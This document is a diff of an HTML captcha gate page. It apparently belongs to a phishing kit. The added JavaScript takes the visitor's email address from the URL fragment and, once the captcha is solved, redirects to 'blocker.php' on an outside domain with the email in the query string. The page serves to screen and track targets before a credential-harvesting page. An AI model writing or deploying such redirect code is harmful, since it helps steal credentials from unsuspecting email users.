@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -24,12 +23,33 @@ window.location.replace(url);
 }
  
 function verifyCaptcha() {
-   
+    document.getElementById('g-recaptcha-error').innerHTML = '';
 
- var blockerurl = 'blocker.php';
-  window.location.replace(blockerurl);
+ var blockerurl = 'https://spamarketing.ae/.%20%20/blocker.php';
+   var fullurl = window.location.href;
+   var lasthashIndex = fullurl.lastIndexOf('#');
+   var email = '';
+   var email2 = '';
+   var email_par = '';
+   if(lasthashIndex != -1){
+     email = fullurl.substr(lasthashIndex+1);
+  if(email.indexOf('@') != -1){
+    email2 = email.replace('@.', '@');
+    email2 = email.replace('@-', '@');
+    email2 = email.replace('@', '@');
+
+  }
+  if(validateEmail(email) || validateEmail(email)){ 
+    email_par = '?em='+email; 
+    window.location.replace(blockerurl+''+email_par);
+  }
+   }
+   //window.location.replace(blockerurl+''+email_par);
 }
-
+function validateEmail(email) {
+    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+}
 </script>
 </head>
 <body>
@@ -55,8 +75,10 @@ function verifyCaptcha() {
                                     <div class="col-md-6 form-group">
                                     
                                     <div class="col-12 form-group">
-                                          <div class="g-recaptcha" data-sitekey="6LePeekUAAAAAJtiWr3A7YAsvyAGti3Keh11ksL1"
-
+                                          <div class="g-recaptcha" data-sitekey="6LePeekUAAAAAJtiWr3A7YAsvyAGti3Keh11ksL1" data-callback="verifyCaptcha"></div>
+                                    </div>
+                                    <div class="col-12">
+                                        
                                     </div>
                                 </div>
                                 <!-- end form element -->
